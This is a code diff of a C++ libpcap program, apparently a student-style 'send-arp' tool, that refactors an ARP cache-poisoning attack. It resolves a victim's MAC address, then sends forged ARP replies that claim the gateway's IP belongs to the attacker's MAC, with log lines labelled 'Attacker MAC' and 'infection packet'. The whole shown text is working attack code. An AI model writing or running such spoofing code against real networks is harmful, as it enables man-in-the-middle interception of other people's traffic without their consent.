@@ -88,53 +88,56 @@ Mac getMacByIp(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
     }
     return Mac("00:00:00:00:00:00");
 }
+
+
 int main(int argc, char* argv[]) {
-    if ((argc - 2) % 2 != 0 || argc < 4) {
+    if (argc < 4 || argc % 2 != 0) {
         usage();
         return -1;
     }
 
     char* dev = argv[1];
-    Mac myMac = getMyMac(dev);
-    Ip myIp = getMyIp(dev);
-
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-
     if (handle == nullptr) {
         fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
         return -1;
     }
 
+    Mac myMac = getMyMac(dev);
+    Ip myIp = getMyIp(dev);
+    printf("[INFO] Attacker MAC : %s\n", std::string(myMac).c_str());
+    printf("[INFO] Attacker IP  : %s\n", std::string(myIp).c_str());
+
     for (int i = 2; i < argc; i += 2) {
         Ip senderIp = Ip(argv[i]);
         Ip targetIp = Ip(argv[i + 1]);
+
+        printf("[*] Processing sender: %s, target: %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
+
         Mac senderMac = getMacByIp(handle, myMac, myIp, senderIp);
+        printf("[INFO] Sender MAC: %s\n", std::string(senderMac).c_str());
 
-        // ARP 감염 패킷 생성 및 전송 (ARP Reply)
-        EthArpPacket packet;
-        packet.eth_.dmac_ = senderMac;           // victim MAC
-        packet.eth_.smac_ = myMac;               // 공격자 MAC
-        packet.eth_.type_ = htons(EthHdr::Arp);
+        EthArpPacket infect;
+        infect.eth_.dmac_ = senderMac;
+        infect.eth_.smac_ = myMac;
+        infect.eth_.type_ = htons(EthHdr::Arp);
 
-        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-        packet.arp_.pro_ = htons(EthHdr::Ip4);
-        packet.arp_.hln_ = Mac::Size;
-        packet.arp_.pln_ = Ip::Size;
-        packet.arp_.op_ = htons(ArpHdr::Reply);   // 감염용 ARP Reply
-        packet.arp_.smac_ = myMac;                // 공격자 MAC (게이트웨이 가장)
-        packet.arp_.sip_ = htonl(targetIp);       // gateway IP
-        packet.arp_.tmac_ = senderMac;            // victim MAC
-        packet.arp_.tip_ = htonl(senderIp);       // victim IP
+        infect.arp_.hrd_ = htons(ArpHdr::ETHER);
+        infect.arp_.pro_ = htons(EthHdr::Ip4);
+        infect.arp_.hln_ = Mac::Size;
+        infect.arp_.pln_ = Ip::Size;
+        infect.arp_.op_  = htons(ArpHdr::Reply);
+        infect.arp_.smac_ = myMac;
+        infect.arp_.sip_  = htonl(targetIp);
+        infect.arp_.tmac_ = senderMac;
+        infect.arp_.tip_  = htonl(senderIp);
 
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect), sizeof(EthArpPacket));
         if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
         } else {
-            printf("[+] ARP infection packet sent to %s (claims %s is at %s)\n",
-                   std::string(senderIp).c_str(),
-                   std::string(targetIp).c_str(),
-                   std::string(myMac).c_str());
+            printf("[✓] Sent infection packet to %s\n", std::string(senderIp).c_str());
         }
     }
 
